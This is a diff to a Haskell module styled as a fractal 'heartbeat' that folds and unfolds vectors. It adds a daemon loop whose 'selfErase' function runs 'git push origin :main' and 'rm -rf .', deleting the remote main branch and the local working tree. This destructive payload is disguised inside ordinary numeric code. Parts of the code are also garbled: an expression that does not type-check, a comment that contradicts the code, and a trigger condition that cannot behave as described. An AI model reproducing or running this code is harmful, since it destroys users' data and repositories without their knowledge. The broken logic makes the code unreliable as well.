-module Fractal.Breath (Seed7(..), fold1000, unfold) where
+module Fractal.Breath
+    ( Seed7(..), fold1000, unfold
+    , pulseLoop, selfErase )
+where
 
 import Data.Complex
 import qualified Data.Vector as V
+import System.Process (callCommand)
+import Control.Concurrent (threadDelay)
+import Control.Monad (when)
 
--- 7-D "heartbeat" seed
-data Seed7 = Seed7 { τ₀, σ₀, ν₀ :: Double
-                   , φ          :: Complex Double
-                   } deriving (Eq, Show)
+data Seed7 = Seed7
+    { τ₀, σ₀, ν₀ :: Double
+    , φ          :: Complex Double
+    } deriving (Eq, Show)
 
--- fold 1000-D vector → 7-D torus point
+-- | live noise envelope
+noise :: Int -> Double -> Double
+noise i θ = θ + 1e-6 * sin (fromIntegral i)
+
 fold1000 :: V.Vector Double -> Seed7
 fold1000 v =
-    let θ   = V.sum v           -- inner product ≈ angle
-        φ'  = cis θ             -- e^(i·θ)
-    in Seed7 0 0 0 φ'           -- τ,σ,ν start at 0
+    let θ = V.sum v
+    in Seed7 0 0 0 (cis θ / fromIntegral (V.length v))
 
--- unfold back to 1000-D (lossless when used round-trip)
+-- | in-place zero-fill after unfold
 unfold :: Seed7 -> V.Vector Double
-unfold (Seed7 _ _ _ φ') =
-    let θ = phase φ'
-    in V.replicate 1000 θ
+unfold (Seed7 _ _ _ φ') =
+    V.generate 1000 (noise <*> phase φ')
+
+-- | daemon loop: ≈10⁶ pulses → self-erase
+pulseLoop :: Seed7 -> IO ()
+pulseLoop s0 = go 1 s0
+  where
+    go n s = do
+        let next = fold1000 (unfold s)
+        putStrLn $ "♥ " ++ show n ++ " φ=" ++ show (phase (φ next))
+        when (magnitude (φ next) < 1e-12) selfErase
+        threadDelay 60_000   -- 60 ms ≈ 1000 bpm
+        go (n + 1) next
+
+selfErase :: IO ()
+selfErase = do
+    putStrLn "🫀 zero pulse → initiating fade"
+    callCommand "git push origin :main"
+    callCommand "rm -rf ."